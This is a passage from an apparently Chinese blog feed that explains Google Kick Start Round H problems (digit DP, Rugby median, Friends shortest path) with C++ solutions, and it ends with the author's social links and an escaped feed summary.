class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; arr[i<span class="number">-1</span>]; ++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>((j%<span class="number">2</span>) == (i%<span class="number">2</span>)) dp[i][<span class="number">1</span>] += dp[i<span class="number">-1</span>][<span class="number">0</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ans += dp[m][<span class="number">0</span>];</span><br><span class="line">    ans += dp[m][<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">slove</span><span class="params">(<span class="keyword">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> l,r;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;l&gt;&gt;r;</span><br><span class="line">    ans = count(r) - count(l<span class="number">-1</span>);</span><br><span class="line">    <span class="comment">//cout&lt;&lt;count(r)&lt;&lt;":"&lt;&lt;count(l-1)&lt;&lt;endl;</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    cnt[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">18</span>; ++i)&#123;</span><br><span class="line">        cnt[i] = cnt[i<span class="number">-1</span>]*<span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; t; ++i)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"Case #"</span>&lt;&lt;i+<span class="number">1</span>&lt;&lt;<span class="string">": "</span>;</span><br><span class="line">        slove(i+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Rugby-1"><a href="#Rugby-1" class="headerlink" title="Rugby"></a>Rugby</h2><p>给定一堆坐标$(x_{i},y_{i})$,求将这些坐标变为一行的最小曼哈顿距离之和:<br>$(X,Y),(X+1,Y),(X+2,Y),(X+3,Y),(X+4,Y)…(X+N,Y)$.</p><h3 id="题意-4"><a href="#题意-4" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 中位数。</p><h3 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h3><ol><li>我们仔细观察一下，实际上目标值的<code>(x,y)</code>实际上是独立的，相互之间不影响，则我们可以分别来求出<code>(X,Y)</code>。<script type="math/tex; mode=display">Target = min(\sum_{i=0}^{n-1}abs(x_{i}-X-i) + \sum_{i=0}^{n-1}abs(x_{i}-Y)</script></li><li>在已知条件下，我们很容易求出<code>y</code>的值，因为知道要满足距离之和最小的值为中位数。我们对所有坐标的纵坐标按照大小进行排序,<code>Y</code>即为排序后的中位数。<script type="math/tex; mode=display">Y = \frac{y_{\frac{n-1}{2}} + y_{\frac{n}{2}}}{2}</script></li><li>我们再来求<code>X</code>,我们同样也对<code>x</code>进行排序，我们需要求出$\sum_{i=0}^{n-1}abs(x_{i}-X-i)$的最小值，实际上可以转为$\sum_{i=0}^{n-1}abs((x_{i}-i) -X)$的最小值，因此我们此时构造数组：<script type="math/tex; mode=display">(x_{0},x_{1}-1,x_{2}-2,x_{3}-3...,x_{n}-n)</script>此时求最小距离之和可以转换为求中位数即可，满足题目要求，此时我们相当于求上述转化数组的中位数。<h3 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; pii;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">slove</span><span class="params">(<span class="keyword">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> midx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> midy = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">long</span> <span class="keyword">long</span>&gt; arrx(n);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">long</span> <span class="keyword">long</span>&gt; arry(n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;arrx[i]&gt;&gt;arry[i];</span><br><span class="line">    &#125;</span><br><span class="line">    sort(arry.begin(),arry.end());</span><br><span class="line">    sort(arrx.begin(),arrx.end());</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">        arrx[i] -= i;</span><br><span class="line">    &#125;</span><br><span class="line">    sort(arrx.begin(),arrx.end());</span><br><span class="line">    midx = (arrx[(n<span class="number">-1</span>)/<span class="number">2</span>] + arrx[n/<span class="number">2</span>])/<span class="number">2</span>;</span><br><span class="line">    midy = (arry[(n<span class="number">-1</span>)/<span class="number">2</span>] + arry[n/<span class="number">2</span>])/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">        ans += <span class="built_in">abs</span>(arrx[i]-midx);</span><br><span class="line">        ans += <span class="built_in">abs</span>(arry[i]-midy);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; t; ++i)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"Case #"</span>&lt;&lt;i+<span class="number">1</span>&lt;&lt;<span class="string">": "</span>;</span><br><span class="line">        slove(i+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="Friends-1"><a href="#Friends-1" class="headerlink" title="Friends"></a>Friends</h2><h3 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h3><p>给定图，图中的每个节点含有一个字符串，如果两个字符串<code>s,t</code>存在有相同字母，则认为两个节点存在相互连接的边，给定一组查询<code>(x,y)</code>，求节点<code>x</code>与<code>y</code>之间的最短路劲。</p><h3 id="题意-5"><a href="#题意-5" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 图的遍历</p><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><ol><li>题目挺有新意的，如果直接用<code>bfs</code>来遍历图的话，按照图中给定的数据集肯定会超时，所以必须要转换思路。</li><li>我们可以转换成求字符<code>a,b</code>的最短距离。我们可以求所所有字符的最短转移路劲，本题也就转化为求所有可能的字符的最短转换路径。</li><li>我们假设源字符串为<code>s</code>，目标字符串为<code>t</code>，假如<code>s</code>和<code>t</code>之间存在相同的字符<code>e</code>，则很容易我们知道直接跳一步即可得到结果,<code>chain</code>的最短长度应该为<code>2</code>。<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s-<span class="function"><span class="params">(e)</span>-&gt;</span>t</span><br></pre></td></tr></table></figure>假如<code>s</code>和<code>t</code>之间是通过不同的字符进行跳转得到的结果，且目标的最短的<code>chain</code>为：<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s-<span class="function"><span class="params">(c1)</span>-&gt;</span>s1-<span class="function"><span class="params">(c2)</span>-&gt;</span>s2-<span class="function"><span class="params">(c3)</span>-&gt;</span>s3-&gt;...<span class="function">-&gt;</span>sn-<span class="function"><span class="params">(cn)</span>-&gt;</span>t</span><br></pre></td></tr></table></figure>根据以上推论我们可以知道如果满足最短的<code>chain</code>，则必然可以得到以下结论:<script type="math/tex; mode=display">c_{1} \neq c_{2} \neq c_{3} \neq c_{4} \neq c_{5} .... \neq c_{n}</script>我们假设存在$c_{i} = c_{j}$,则我们可以判定直接可以通过<code>i</code>跳转到<code>j</code>即可，而不必再通过$c_{i+1},c_{i+2},…,c_{j-1}$进行跳转,因此我们只需求出不同字符之间跳转的最短距离即可。我们可以设相同字符的跳转距离为<code>0</code>.</li><li>我们可以很容易求出，两个字符串之间的字符跳转的最短转换距离，最终的答案为$minJump + 2$.<h3 id="代码-6"><a href="#代码-6" class="headerlink" title="代码"></a>代码</h3></li></ol></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; pii;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> INF = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">slove</span><span class="params">(<span class="keyword">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,q;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;q;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; arr(n);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; dp(<span class="number">26</span>,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;(<span class="number">26</span>,INF));</span><br><span class="line">    <span class="built_in">vector</span>&lt;pii&gt; query(q);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) <span class="built_in">cin</span>&gt;&gt;arr[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; q; ++i) <span class="built_in">cin</span>&gt;&gt;query[i].first&gt;&gt;query[i].second;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; ++i) dp[i][i] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> s : arr)&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">bool</span>&gt; count(<span class="number">26</span>,<span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> c : s) count[c-<span class="string">'A'</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">26</span>; ++j)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; <span class="number">26</span>; ++k)&#123;</span><br><span class="line">                <span class="keyword">if</span>(j == k) <span class="keyword">continue</span>;</span><br><span class="line">                <span class="keyword">if</span>(count[j]&amp;&amp;count[k])&#123;</span><br><span class="line">                    dp[j][k] = <span class="number">1</span>;</span><br><span class="line">                    dp[k][j] = <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; ++i)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">26</span>; ++j)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; <span class="number">26</span>; ++k)&#123;</span><br><span class="line">                dp[i][k] = min(dp[i][k],dp[i][j] + dp[j][k]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> v : query)&#123;</span><br><span class="line">        <span class="keyword">int</span> x = v.first - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> y = v.second - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> curr = INF;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> a : arr[x])&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">auto</span> b : arr[y])&#123;</span><br><span class="line">                curr = min(curr,dp[a-<span class="string">'A'</span>][b-<span class="string">'A'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;(curr == INF ? (<span class="number">-1</span>) : (curr + <span class="number">2</span>))&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; t; ++i)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"Case #"</span>&lt;&lt;i+<span class="number">1</span>&lt;&lt;<span class="string">": "</span>;</span><br><span class="line">        slove(i+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id><a href="#" class="headerlink" title="#"></a>#</h2><p>欢迎关注和打赏，感谢支持！</p><ul><li>关注我的博客: <a href="http://mikemeng.org/" target="_blank" rel="noopener">http://mikemeng.org/</a></li><li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu" target="_blank" rel="noopener">https://www.zhihu.com/people/da-hua-niu</a></li><li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;google-kickstart-round-H&quot;&gt;&lt;a href=&quot;#google-kickstart-round-H&quot; class=&quot;headerlink&quot; title=&quot;google kickstart round H&quot;&gt;&lt;/a&gt;google kickstart round H&lt;/h1&gt;&lt;p&gt;&lt;code&gt;google kick start&lt;/code&gt;的题目果真经典并且又不失思考的乐趣，质量非常高的题目，我觉得思考的深度非常有代表性。&lt;/p&gt;&lt;h2 id=&quot;Problem-A-Retype&quot;&gt;&lt;a href=&quot;#Problem-A-Retype&quot; class=&quot;headerlink&quot; title=&quot;Problem A - Retype&quot;&gt;&lt;/a&gt;Problem A - Retype&lt;/h2&gt;&lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;选择游戏重启的位置&lt;/p&gt;&lt;h3 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;真心是送分问题，一共只有两种选择，要么从头开始，要么倒回到第&lt;code&gt;s&lt;/code&gt;关开始。&lt;script type=&quot;math/tex; mode=display&quot;&gt;
minT = k + min(n,k+n-2*s)&lt;/script&gt;&lt;h3 id=&quot;代码&quot;&gt;&lt;a href=&quot;#代码&quot; class=&quot;headerlink&quot; title=&quot;代码&quot;&gt;&lt;/a&gt;代码&lt;/h3&gt;&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;meta-string&quot;&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;meta-string&quot;&gt;&amp;lt;vector&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;meta-string&quot;&gt;&amp;lt;set&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;meta-string&quot;&gt;&amp;lt;unordered_set&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;meta-string&quot;&gt;&amp;lt;map&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;meta-string&quot;&gt;&amp;lt;unordered_map&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;meta-string&quot;&gt;&amp;lt;string&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stack&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;meta-string&quot;&gt;&amp;lt;algorithm&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;namespace&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;std&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;typedef&lt;/span&gt; pair&amp;lt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;,&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;&amp;gt; pii;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;slove&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; t)&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; n,k,s;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; ans = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;cin&lt;/span&gt;&amp;gt;&amp;gt;n&amp;gt;&amp;gt;k&amp;gt;&amp;gt;s;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ans = k + min(n,k+n&lt;span class=&quot;number&quot;&gt;-2&lt;/span&gt;*s);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span 